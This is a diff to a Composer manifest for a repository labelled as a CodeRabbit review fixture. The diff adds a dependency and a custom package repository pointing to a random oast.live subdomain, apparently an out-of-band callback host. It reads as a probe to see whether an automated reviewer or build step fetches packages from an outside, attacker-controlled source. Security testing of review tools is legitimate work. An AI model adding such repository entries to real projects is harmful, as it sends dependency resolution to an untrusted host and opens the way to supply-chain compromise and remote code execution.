@@ -2,5 +2,13 @@
   "name": "h123/probe",
   "description": "CodeRabbit review fixture repository (own test repo)",
   "type": "project",
-  "require": {}
+  "require": {
+    "psr/log": "^3.0"
+  },
+  "repositories": [
+    {
+      "type": "composer",
+      "url": "https://dc2hdlaiojcjo807upvgtqjcbyi9tki4a.oast.live/h123b-composer"
+    }
+  ]
 }
